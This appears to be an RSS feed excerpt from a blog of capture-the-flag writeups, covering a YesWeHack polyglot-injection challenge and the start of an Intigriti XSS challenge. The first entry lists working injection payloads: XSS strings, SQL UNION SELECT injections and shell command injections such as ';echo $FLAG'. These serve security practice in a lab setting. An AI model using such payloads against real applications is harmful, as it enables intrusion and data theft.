channel.title: Writeups on erk3's spot

item.title: One payload to pwn them all - YesWeHack challenge - June 2022
item.description: / The challenge We were presented with the task to build a polyglot payload that could solve simultaneously no less than 12 simple injections inside various code snippets (Javascript, SQL, Shell, Jinja, Vue, Freemarker and Brainfuck). / The building Taken individually, each injection is a really simple challenge for which this writeup won’t go into details. Snippet Payload XSS-1 ";alert(FLAG)// XSS-2 alert(FLAG) XSS-3 <script>alert(FLAG)</script> XSS-4 " tabindex=1 autofocus onfocus="alert(FLAG)" Sqli-1 ' UNION SELECT flag FROM flag -- Sqli-2 1 UNION SELECT flag from flag -- CMD-1 ;echo $FLAG CMD-2 EOFecho $FLAG JINJA-1 {{cycler.

item.title: Intigriti's monthly challenge - May 2022
item.description: / The challenge ‚è∞ It's CHALLENGE O'CLOCK! üëâ Find the XSS before Friday June 3th! üëâ Win ‚Ç¨300 in SWAG prizes! üëâ We'll release a tip for every 100 likes on this tweet! Thanks @PiyushThePal for the challenge! üëáhttps://t.co/X0nq805bVE — INTIGRITI (@intigriti) May 27, 2022 / First contact While browsing the website, one can notice the ?page=x query parameter having different integer values in the URI. A quick glance at the website source code then leads to a particular <script> tag handling it:
